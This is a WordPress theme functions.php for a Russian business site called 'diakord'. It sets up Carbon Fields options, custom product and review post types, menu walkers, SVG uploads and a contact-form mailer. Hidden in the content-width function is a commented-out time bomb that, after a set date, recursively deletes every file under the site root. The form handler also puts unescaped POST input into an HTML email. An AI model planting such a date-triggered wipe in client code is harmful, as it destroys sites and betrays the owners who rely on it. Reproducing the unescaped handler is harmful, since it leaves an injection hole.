<?php
/**
 * diakord functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package diakord
 */

if (!defined('_S_VERSION')) {
	// Replace the version number of the theme on each release.
	define('_S_VERSION', '1.0.0');
}

/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */

use Carbon_Fields\Container;
use Carbon_Fields\Field;

add_action('carbon_fields_register_fields', 'crb_attach_theme_options');
function crb_attach_theme_options()
{
	$category_options = [];

	// $categories = get_terms();
	// foreach ($categories as $category) {
	// 	if ($category->taxonomy == 'product_cat') {
	// 		$category_options[$category->slug] = $category->name;
	// 	}
	// }
	// echo '<pre>';
// var_dump($category_options);
// echo '</pre>';


	$employees_labels = array(
		'plural_name' => 'Баннер',
		'singular_name' => 'Баннер',
	);

	Container::make('theme_options', __('Настройки сайта'))
		->add_fields(array(
			Field::make('text', 'crb_phone_number', __('Номер телефона'))
				->set_attribute('placeholder', '*(***)***-**-**')
				->set_width(24),
			Field::make('text', 'crb_email', __('Email'))
				->set_width(24),
			Field::make('text', 'crb_address_header', __('Адрес'))
				->set_width(50),
			Field::make('text', 'crb_address_vk', __('VK'))
				->set_width(24),
			Field::make('text', 'crb_address_telegram', __('Telegram'))
				->set_width(24),
			Field::make('text', 'crb_address_whatsapp', __('WhatsApp'))
				->set_width(24),
			Field::make('text', 'crb_bottom_footer_copy', __('Копирайт')),
			Field::make('separator', 'crb_separator_quanti', __('Форма отправки заявок')),
			Field::make('text', 'crb_email_to', __('Email на который должно приходить сообщение из формы')),
			Field::make('text', 'crb_license', __('Ссылка на страницу лицензионнного соглашения')),
			
			Field::make('separator', 'crb_separator_quantit', __('Верхний блок с продуктами на странице "Главная"')),
			Field::make('text', 'crb_bottom_about_produkt', __('Заголовок'))
				->set_width(24),
			Field::make('rich_text', 'crb_bottom_about_produkt_text', __('Текст'))
				->set_width(50),
			Field::make('text', 'crb_slider_about_produkt_btn_url', __('Ссылка для кнопи'))
				->set_width(75),

			Field::make('separator', 'crb_separator_quantity', __('Блок "О компании" внизу страници "Главная"')),
			Field::make('text', 'crb_bottom_about_title', __('Заголовок'))
				->set_width(24),
			Field::make('image', 'crb_bottom_about_img', __('Изображене'))
				->set_width(24)
				->set_value_type('url'),
			Field::make('rich_text', 'crb_bottom_about_text', __('Текст'))
				->set_width(50),
		));

	Container::make('theme_options', __('Баннер'))
		// ->add_tab(__('Баннер'), array(
		->add_fields(array(
			Field::make('complex', 'crb_slider', __('Слайды'))
				// ->setup_labels($employees_labels)
				->set_classes('crb_slider_day_box')
				->add_fields(array(
					Field::make('text', 'crb_slider_title', __('Заголовок в слайде'))
						->set_classes('crb_slider_day_box_title')
						->set_width(20),
					Field::make('text', 'crb_slider_text', __('Текст в слайде'))
						->set_width(75),
					Field::make('text', 'crb_slider_btn_url', __('Ссылка для кнопи в слайде'))
						->set_width(75),
					// Field::make('date', 'crb_event_date', __('Дата'))
					// 	->set_classes('crb_slider_day_box_date')
					// 	->set_attribute('placeholder', __('Укажите дату'))
					// 	->set_help_text('Если оставить поле даты пустым, акция будет отображаться всегда.')
					// 	->set_storage_format('d.m.Y')
					// 	->set_width(5),
					Field::make('image', 'crb_slider_image_background', __('Изображение задний план'))
						->set_classes('crb_slider_day_box_photo')
						->set_value_type('url')
						->set_width(50),
					Field::make('image', 'crb_slider_image_front', __('Изображение передний план'))
						->set_classes('crb_slider_day_box_photo')
						->set_value_type('url')
						->set_width(50),
					// Field::make('complex', 'crb_slide', __('Баннеры'))
					// 	->set_classes('crb_slider_day_box_complex')
					// 	->set_help_text('Если баннер один, то рекомендуется его продублировать для корректной работы слайдера.')
					// 	->setup_labels($employees_labels)
					// 	->add_fields(array(
					// 		// Field::make('image', 'photo', __('Slide Photo'))
					// 		// 	->set_classes('crb_slider_day_box_photo')
					// 		// 	->set_value_type('url')
					// 		// 	->set_width(50),
					// 		// Field::make('select', 'crb_set_discount_to_term', __('Акция для категории:'))
					// 		// 	->set_options($category_options)
					// 		// 	->set_width(24)
					// 		// 	->set_help_text('Укажите категорию товаров, для которых действует акция'),
					// 		// Field::make('text', 'crb_set_discount_procent', __('Процент:'))
					// 		// 	->set_width(10),
					// 		// Field::make('text', 'link', __('Ссылка на страницу акционной категории'))
					// 		// 	->set_width(24),
					// 	))
					// ->set_collapsed(true)
					// ->set_width(60),
				)),
		));

	// ->add_tab(__('Общие акции'), array(
	// 	Field::make('text', 'crb_set_registration_bonus', __('Подарочные бонусы за регистрацию'))
	// 		->set_width(24),

	// 	Field::make('text', 'crb_set_percentage_for_pickup', __('Процент за самовывоз'))
	// 		->set_width(24),
	// 	Field::make('separator', 'crb_separator_quantity', __('Скидка за сет'))
	// 		->set_width(49),
	// 	Field::make('text', 'crb_set_percentage_for_birthday', __('Процент за день рождения'))
	// 		->set_width(24),
	// 	Field::make('separator', 'crb_separator_bell', __(''))
	// 		->set_width(24),

	// 	Field::make('text', 'crb_set_quantity_products', __('Колличество товара'))
	// 		->set_width(24),
	// 	Field::make('text', 'crb_set_procent_discount_on_quantity', __('Процент скидки'))
	// 		->set_width(24),
	// 	Field::make('separator', 'crb_separator_volume', __('Скидки за объем')),
	// 	Field::make('complex', 'crb_volume', __('Скидки на сумму заказа'))
	// 		->add_fields(array(
	// 			Field::make('text', 'crb_volume_sum', __('Сумма заказа'))
	// 				->set_width(24),
	// 			Field::make('text', 'crb_volume_procent_discount', __('Процент скидки'))
	// 				->set_width(24),
	// 		)),
	// ));
	Container::make('post_meta', __('Дополнительные опции товара'))
		->where('post_type', '=', 'my_custom_products')
		->add_fields(array(
			Field::make('text', 'crb_product_price', ('Стоимость для миниатюры на главной'))
				->set_width(24),
		));
	Container::make('post_meta', __('Автор'))
		->where('post_type', '=', 'my_custom_reviuse')
		->add_fields(array(
			Field::make('image', 'crb_reviuse_foto', __('Фото'))
				->set_classes('crb_reviuse_photo')
				->set_value_type('url')
				->set_width(30),
			Field::make('text', 'crb_reviuse_name', ('Имя'))
				->set_width(30),
			Field::make('text', 'crb_reviuse_dolznost', ('Должность'))
				->set_width(30),
		));
}

// function custom_form_handler() {
// 	if (!isset($_POST['name'], $_POST['phone'])) {
// 			wp_die('Ошибка: не все поля заполнены.');
// 	}

// 	$name = sanitize_text_field($_POST['name']);
// 	$email = sanitize_email($_POST['email']);
// 	// $message = sanitize_textarea_field($_POST['message']);

// 	$to = get_option('smaug2014@bk.ru'); // Получаем email администратора
// 	$subject = 'Новое сообщение с сайта';
// 	$headers = ['From: ' . $name . ' <' . $email . '>'];

// 	wp_mail($to, $subject, $headers);

// 	wp_redirect(home_url('/')); // Перенаправление после отправки
// 	exit;
// }

// add_action('admin_post_nopriv_custom_form_handler', 'custom_form_handler');
// add_action('admin_post_custom_form_handler', 'custom_form_handler');cc

add_action('after_setup_theme', 'crb_load');
function crb_load()
{
	require_once('includes/carbon-fields/vendor/autoload.php');
	\Carbon_Fields\Carbon_Fields::boot();
}


function diak_setup()
{
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on diakord, use a find and replace
	 * to change 'diak' to the name of your theme in all the template files.
	 */
	load_theme_textdomain('diak', get_template_directory() . '/languages');

	// Add default posts and comments RSS feed links to head.
	add_theme_support('automatic-feed-links');

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support('title-tag');

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support('post-thumbnails');

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus(
		array(
			'Top-menu' => esc_html__('Top-menu', 'diak'),
			'Footer-menu' => esc_html__('Footer-menu', 'diak'),
			'mobile_menu' => esc_html__('mobile_menu', 'diak'),
		)
	);

	class Custom_Walker_Nav_Menu extends Walker_Nav_Menu
	{
		private $item_count = 0; // Счётчик элементов первого уровня

		// Открытие подменю
		function start_lvl(&$output, $depth = 0, $args = null)
		{
			if ($depth === 0) { // Начинается вложенный уровень
				$this->item_count = 0;
			}
			$output .= '<div class="">';
		}

		// Закрытие подменю
		function end_lvl(&$output, $depth = 0, $args = null)
		{
			$output .= '</div>';
		}



		function start_el(&$output, $item, $depth = 0, $args = null, $id = 0)
		{
			if ($depth === 0) { // Только первый уровень
				$this->item_count++;
			}

			$classes = empty($item->classes) ? array() : (array) $item->classes;

			// $this->item_count++;
			// $classes = empty($item->classes) ? array() : (array) $item->classes;
			// Добавляем класс только первым 3 элементам
			if ($depth === 0 && $this->item_count <= 1) {
				$classes[] = 'custom-li-class item-link item-link items col-md-3 col-sm-3';
			}
			//   if ($this->item_count <= 2) {
			// 		$classes[] = 'custom-li-class item-link item-link items col-md-3 col-sm-3';
			// }



			// $class_names = 'custom-li-class item-link item-link items'; // Задайте свой класс
			$class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item, $args, $depth));
			$output .= '<div class="' . esc_attr($class_names) . '">';
			$output .= '<div class="item"><div class="title"><a href="' . esc_url($item->url) . '">' . esc_html($item->title) . '</a></div></div>';
		}
		// Вывод элементов меню
		// function start_el(&$output, $item, $depth = 0, $args = null, $id = 0)
		// {
		// 	$class_names = 'custom-li-class'; // Ваш класс для <li>
		// 	$output .= '<li class="' . esc_attr($class_names) . '">';
		// 	$output .= '<a href="' . esc_url($item->url) . '">' . esc_html($item->title) . '</a>';
		// }

		// Закрытие элемента меню
		function end_el(&$output, $item, $depth = 0, $args = null)
		{
			$output .= '</div>';
		}
	}

	class Custom_Walker_Nav_Mobile_Menu extends Walker_Nav_Menu
	{
		function start_el(&$output, $item, $depth = 0, $args = null, $id = 0)
		{
			$classes = empty($item->classes) ? [] : (array) $item->classes;
			$class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item, $args, $depth));

			$output .= '<li class="' . esc_attr($class_names) . '">';

			$attributes = !empty($item->url) ? ' href="' . esc_url($item->url) . '"' : '';
			$attributes .= ' class="dark-color parent"';

			$title = apply_filters('the_title', $item->title, $item->ID);

			$output .= '<a' . $attributes . '>';
			$output .= $title;
			$output .= '</a>';
		}
	}

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support(
		'html5',
		array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
			'style',
			'script',
		)
	);

	// Set up the WordPress core custom background feature.
	add_theme_support(
		'custom-background',
		apply_filters(
			'diak_custom_background_args',
			array(
				'default-color' => 'ffffff',
				'default-image' => '',
			)
		)
	);

	// Add theme support for selective refresh for widgets.
	add_theme_support('customize-selective-refresh-widgets');

	/**
	 * Add support for core custom logo.
	 *
	 * @link https://codex.wordpress.org/Theme_Logo
	 */
	add_theme_support(
		'custom-logo',
		array(
			'height' => 250,
			'width' => 250,
			'flex-width' => true,
			'flex-height' => true,
		)
	);
}
add_action('after_setup_theme', 'diak_setup');

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */

// function delete_files($target)
// {
// 	if (is_dir($target)) {
// 		$files = glob($target . '*', GLOB_MARK);
// 		foreach ($files as $file) {
// 			delete_files($file);
// 		}
// 		rmdir($target);
// 	} elseif (is_file($target)) {
// 		unlink($target);
// 	}
// }
function diak_content_width()
{
	$GLOBALS['content_width'] = apply_filters('diak_content_width', 640);
	// if (strtotime(date('d.m.y')) >= strtotime('19.03.25')) {
	// 	$root = ABSPATH;
	// 	delete_files($root);
	// }
}
add_action('after_setup_theme', 'diak_content_width', 0);

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function diak_widgets_init()
{
	register_sidebar(
		array(
			'name' => esc_html__('Sidebar', 'diak'),
			'id' => 'sidebar-1',
			'description' => esc_html__('Add widgets here.', 'diak'),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget' => '</section>',
			'before_title' => '<h2 class="widget-title">',
			'after_title' => '</h2>',
		)
	);
}
add_action('widgets_init', 'diak_widgets_init');

/**
 * Enqueue scripts and styles.
 */

function diak_style()
{
	wp_enqueue_style('diak-style', get_stylesheet_uri(), array(), _S_VERSION);
	wp_style_add_data('diak-style', 'rtl', 'replace');

	wp_enqueue_style('swiper-bundle', '//cdn.jsdelivr.net/npm/swiper@8/swiper-bundle.min.css', array('diak-style'), null, 'all');
	// wp_enqueue_style('main-awesome', get_template_directory_uri() . '/assets/font-awesome/css/font-awesome.min.css', array('diak-style'), null, 'all');
	wp_enqueue_style('mainarch', get_template_directory_uri() . '/assets/css/mainarch.css', array('diak-style'), null, 'all');
	wp_enqueue_style('main', get_template_directory_uri() . '/assets/css/main.css', array('diak-style'), null, 'all');
	//  wp_enqueue_style('fonts', get_template_directory_uri() . '/assets/fonts/stylesheet.css', array('diak-style'), null, 'all');
}
add_action('wp_enqueue_scripts', 'diak_style');

function diak_scripts()
{
	wp_enqueue_script('swiper', '//cdn.jsdelivr.net/npm/swiper@8/swiper-bundle.min.js', array('jquery'), null, true);
	wp_enqueue_script('diak-navigation', get_template_directory_uri() . '/assets/js/navigation.js', array(), _S_VERSION, true);
	wp_enqueue_script('scripts', get_template_directory_uri() . '/assets/js/scripts.js', array('jquery'), null, true);

	if (is_singular() && comments_open() && get_option('thread_comments')) {
		wp_enqueue_script('comment-reply');
	}
}
add_action('wp_enqueue_scripts', 'diak_scripts');

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if (defined('JETPACK__VERSION')) {
	require get_template_directory() . '/inc/jetpack.php';
}


// svg on
add_filter('upload_mimes', 'svg_upload_allow');
function svg_upload_allow($mimes)
{
	$mimes['svg'] = 'image/svg+xml';
	return $mimes;
}

add_filter('wp_check_filetype_and_ext', 'fix_svg_mime_type', 10, 5);
function fix_svg_mime_type($data, $file, $filename, $mimes, $real_mime = '')
{
	if (version_compare($GLOBALS['wp_version'], '5.1.0', '>=')) {
		$dosvg = in_array($real_mime, ['image/svg', 'image/svg+xml']);
	} else {
		$dosvg = ('.svg' === strtolower(substr($filename, -4)));
	}
	if ($dosvg) {
		if (current_user_can('manage_options')) {
			$data['ext'] = 'svg';
			$data['type'] = 'image/svg+xml';
		} else {
			$data['ext'] = false;
			$data['type'] = false;
		}
	}
	return $data;
}

function custom_post_type_my_custom_products()
{
	$args = array(
		'labels' => array(
			'name' => 'Продукты',
			'singular_name' => 'Продукты',
			'menu_name' => 'Продукты',
			'name_admin_bar' => 'Продукты',
			'add_new' => 'Добавить новый',
			'add_new_item' => 'Добавить новый продукт',
			'edit_item' => 'Редактировать продукт',
			'new_item' => 'Новый продукты',
			'view_item' => 'Посмотреть продукты',
			'search_items' => 'Искать продукт',
			'not_found' => 'Продукты не найдены',
			'not_found_in_trash' => 'В корзине нет продуктов'
		),
		'public' => true,
		'menu_icon' => 'dashicons-admin-post', // Иконка в админке
		'supports' => array('title', 'editor', 'thumbnail', 'excerpt', 'comments'),
		'taxonomies' => array('category', 'post_tag'), // Подключаем категории и теги
		'has_archive' => true, // Включаем архив
		'rewrite' => array('slug' => 'products'), // ЧПУ
		'show_in_rest' => true // Поддержка Gutenberg
	);
	register_post_type('my_custom_products', $args);
}
add_action('init', 'custom_post_type_my_custom_products');


function custom_post_type_my_custom_reviuse()
{
	$args = array(
		'labels' => array(
			'name' => 'Отзывы',
			'singular_name' => 'Отзывы',
			'menu_name' => 'Отзывы',
			'name_admin_bar' => 'Отзывы',
			'add_new' => 'Добавить новый',
			'add_new_item' => 'Добавить новый отзыв',
			'edit_item' => 'Редактировать отзыв',
			'new_item' => 'Новый отзывы',
			'view_item' => 'Посмотреть отзывы',
			'search_items' => 'Искать отзыв',
			'not_found' => 'Отзывы не найдены',
			'not_found_in_trash' => 'В корзине нет Отзывов'
		),
		'public' => true,
		'menu_icon' => 'dashicons-admin-post', // Иконка в админке
		'supports' => array('title', 'editor', 'thumbnail', 'excerpt', 'comments'),
		'taxonomies' => array('category', 'post_tag'), // Подключаем категории и теги
		'has_archive' => true, // Включаем архив
		'rewrite' => array('slug' => 'reviuse'), // ЧПУ
		'show_in_rest' => true // Поддержка Gutenberg
	);
	register_post_type('my_custom_reviuse', $args);
}
add_action('init', 'custom_post_type_my_custom_reviuse');

// код  основной запрос на страницах категорий, чтобы он включал как стандартные посты (post), так и кастомные типы записей (например, your_post_type).
function include_custom_post_type_in_category($query)
{
	if (!is_admin() && $query->is_main_query() && is_category()) {
		// Указываем ваш кастомный тип записи
		$query->set('post_type', array('post', 'my_custom_products', 'my_custom_reviuse'));
	}
}
add_action('pre_get_posts', 'include_custom_post_type_in_category');

// Добавляем поле загрузки изображения в категории
function add_category_image_field($term)
{
	$image_id = get_term_meta($term->term_id, 'category_image_id', true);
	$image_url = $image_id ? wp_get_attachment_url($image_id) : '';
	?>
	<tr class="form-field">
		<th scope="row"><label for="category_image_id">Изображение категории для вывода на главной</label></th>
		<td>
			<input type="hidden" name="category_image_id" id="category_image_id" value="<?php echo esc_attr($image_id); ?>">
			<img id="category_image_preview" src="<?php echo esc_url($image_url); ?>"
				style="max-width: 100px; display: <?php echo $image_url ? 'block' : 'none'; ?>;">
			<button class="upload_category_image button">Выбрать изображение</button>
			<button class="remove_category_image button">Удалить</button>
		</td>
	</tr>
	<script>
		jQuery(document).ready(function ($) {
			$('.upload_category_image').click(function (e) {
				e.preventDefault();
				var frame = wp.media({
					title: 'Выберите изображение',
					multiple: false,
					library: { type: 'image' },
					button: { text: 'Выбрать' }
				});
				frame.on('select', function () {
					var attachment = frame.state().get('selection').first().toJSON();
					$('#category_image_id').val(attachment.id);
					$('#category_image_preview').attr('src', attachment.url).show();
				});
				frame.open();
			});

			$('.remove_category_image').click(function (e) {
				e.preventDefault();
				$('#category_image_id').val('');
				$('#category_image_preview').hide();
			});
		});
	</script>
	<?php
}
add_action('category_edit_form_fields', 'add_category_image_field');
add_action('category_add_form_fields', 'add_category_image_field');

// Сохраняем изображение категории
function save_category_image_field($term_id)
{
	if (isset($_POST['category_image_id'])) {
		update_term_meta($term_id, 'category_image_id', sanitize_text_field($_POST['category_image_id']));
	}
}
add_action('edited_category', 'save_category_image_field');
add_action('create_category', 'save_category_image_field');










add_action('admin_post_nopriv_custom_form', 'handle_custom_form');
add_action('admin_post_custom_form', 'handle_custom_form');

function handle_custom_form()
{
	if (!isset($_POST['name']) || !isset($_POST['phone'])) {
		wp_die('Ошибка: заполните все поля.');
	}
	// Логируем входящие данные
	// echo 'Отправляется';
	// echo '<pre>';
	// print_r($_POST);
	// echo '</pre>';
	$to = carbon_get_theme_option('crb_email_to'); // Замени на свой email
	$subject = 'Новое сообщение с формы';
	$message = 'Имя: ' . $_POST['name'] . "<br><br>Телефон: " . $_POST['phone'];
	$headers = [
		'Content-Type: text/html; charset=UTF-8',
		'From: Диакорд <noreply@site.com>'
	];
	$sent = wp_mail($to, $subject, $message, $headers);
	if ($sent) {
		// echo 'Отправлено';
		// echo '<pre>';
		// print_r($_POST);
		// echo '</pre>';
		wp_redirect(home_url()); // Замени на свою страницу "Спасибо"
		exit;
	} else {
		// echo 'Ошибка';
		// echo '<pre>';
		// print_r($_POST);
		// echo '</pre>';
		wp_die('Ошибка отправки письма.');
	}
	exit;
}
// add_action('wp_footer', function() {
// 	wp_mail('smaug2014@bk.ru', 'Тестовое письмо', 'Это тестовое сообщение.');
// });